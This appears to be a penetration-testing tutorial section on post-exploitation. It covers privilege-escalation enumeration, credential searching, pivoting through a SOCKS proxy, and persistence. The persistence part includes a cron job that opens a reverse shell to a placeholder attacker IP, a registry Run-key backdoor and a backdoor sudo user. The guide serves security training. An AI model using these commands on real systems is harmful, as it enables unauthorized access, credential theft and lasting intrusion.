## 🔹 Phase 5 – Post-Exploitation

Post-exploitation begins **after** you’ve successfully exploited a vulnerability and gained access to a system. This is where the true value of a penetration test often emerges: what can you do once inside? Can you move laterally? Can you escalate privileges? Can you access sensitive data?

> 🧠 Your goal is not chaos. It’s controlled impact: understand the business risk, map internal systems, and prove access — all while remaining stealthy and safe.

---

## 🧭 Goals of Post-Exploitation

* Maintain access (persistence)
* Escalate privileges (local or domain admin)
* Enumerate the internal network
* Access or exfiltrate sensitive data
* Identify lateral movement opportunities

---

## 🔑 Privilege Escalation

### 🔸 Linux – Automated Enumeration

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Looks for misconfigurations, SUID binaries, credentials, cron jobs, kernel exploits.

### 🔸 Windows – Automated Enumeration

```powershell
Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -OutFile winpeas.bat
winpeas.bat
```

Finds weak services, registry issues, tokens, AlwaysInstallElevated, unquoted paths.

### 🔸 Manual checks (Linux)

```bash
id && whoami
sudo -l
ps aux
ls -la /root/
cat /etc/passwd
```

### 🔸 Manual checks (Windows)

```cmd
whoami /priv
net user
net localgroup administrators
icacls C:\ /T
```

---

## 📡 Internal Reconnaissance

### 🔸 Network Scanning

```bash
ip a   # or ifconfig
ip route
nmap -sP 10.0.0.0/24
nmap -sT -p- 10.0.0.X
```

* Map internal subnets, find additional services

### 🔸 Pivoting (via SOCKS proxy)

```bash
ssh -D 1080 user@target -N
proxychains nmap -sT -Pn 10.0.0.1
```

* Use with `proxychains`, `socks_proxy`, or Burp to explore internal assets

---

## 🔁 Persistence (if allowed)

### 🔸 Add user (Linux)

```bash
useradd -m pentester
passwd pentester
usermod -aG sudo pentester
```

### 🔸 Scheduled reverse shell (Linux)

```bash
echo '* * * * * bash -i >& /dev/tcp/YOURIP/4444 0>&1' >> /var/spool/cron/root
```

### 🔸 Windows – Registry Run Key

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /t REG_SZ /d "C:\rev.exe"
```

> ⚠️ Only apply persistence techniques if explicitly authorized.

---

## 🗃️ Data Collection

* Search for passwords:

```bash
grep -i pass /etc/* 2>/dev/null
find / -name *.kdbx 2>/dev/null
```

* Windows Credential Manager:

```powershell
cmdkey /list
```

* Export browser creds, SSH keys, tokens (if allowed)

---

## 📌 Pro Tips

* Use `script` or terminal logging to record post-ex steps
* Clean up: remove created users, logs, shells (if required)
* Capture screenshots or session transcripts for the report
* Don’t touch sensitive client data unless explicitly instructed
